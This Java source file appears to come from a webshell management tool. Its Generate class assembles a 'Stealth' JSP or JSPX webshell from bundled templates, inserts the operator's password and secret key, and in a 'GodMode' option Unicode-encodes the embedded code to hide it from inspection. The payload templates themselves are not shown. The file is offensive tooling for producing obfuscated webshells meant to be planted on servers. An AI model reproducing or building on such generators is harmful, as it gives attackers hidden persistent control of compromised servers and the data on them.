package shells.cryptions.Stealth;

import core.ApplicationContext;
import core.ui.component.dialog.GOptionPane;
import util.Log;
import util.functions;

import javax.swing.Icon;
import java.awt.Component;
import java.io.InputStream;

class Generate {
   private static final String[] SUFFIX = new String[]{"jsp", "jspx"};

   public static byte[] GenerateShellLoder(String shellName, String pass, String secretKey, boolean isBin) {
      byte[] data = null;

      try {
         // 读取全局代码模板 - 从 resources 目录加载
         String globalFileName = isBin ? "rawGlobalCode.bin" : "base64GlobalCode.bin";
         InputStream inputStream = Generate.class.getResourceAsStream("/shells/cryptions/Stealth/" + globalFileName);
         if (inputStream == null) {
            Log.error("Template file not found: " + globalFileName);
            return null;
         }
         
         String globalCode = new String(functions.readInputStream(inputStream));
         inputStream.close();
         
         // 替换密码和密钥
         globalCode = globalCode.replace("{pass}", pass).replace("{secretKey}", secretKey);
         
         // 读取主要代码模板 - 从 resources 目录加载
         String codeFileName = isBin ? "rawCode.bin" : "base64Code.bin";
         inputStream = Generate.class.getResourceAsStream("/shells/cryptions/Stealth/" + codeFileName);
         if (inputStream == null) {
            Log.error("Template file not found: " + codeFileName);
            return null;
         }
         
         String code = new String(functions.readInputStream(inputStream));
         inputStream.close();
         
         // 选择文件后缀
         Object selectedValue = GOptionPane.showInputDialog((Component)null, "suffix", "selected suffix", 1, (Icon)null, SUFFIX, (Object)null);
         if (selectedValue != null) {
            String suffix = (String)selectedValue;
            
            // 读取 Shell 模板 - 从 resources 目录加载
            inputStream = Generate.class.getResourceAsStream("/shells/cryptions/Stealth/shell." + suffix);
            if (inputStream == null) {
               Log.error("Template file not found: shell." + suffix);
               return null;
            }
            
            String template = new String(functions.readInputStream(inputStream));
            inputStream.close();
            
            // 如果是 jspx 格式,需要转义特殊字符
            if (suffix.equals(SUFFIX[1])) {
               globalCode = globalCode.replace("<", "&lt;").replace(">", "&gt;");
               code = code.replace("<", "&lt;").replace(">", "&gt;");
            }

            // 根据 GodMode 决定是否使用 Unicode 编码
            if (ApplicationContext.isGodMode()) {
               template = template.replace("{globalCode}", functions.stringToUnicode(globalCode))
                                 .replace("{code}", functions.stringToUnicode(code));
            } else {
               template = template.replace("{globalCode}", globalCode)
                                 .replace("{code}", code);
            }

            data = template.getBytes();
         }
      } catch (Exception var11) {
         Log.error((Throwable)var11);
      }

      return data;
   }

   public static byte[] GenerateShellLoder(String pass, String secretKey, boolean isBin) {
      return GenerateShellLoder("", pass, secretKey, isBin);
   }
}
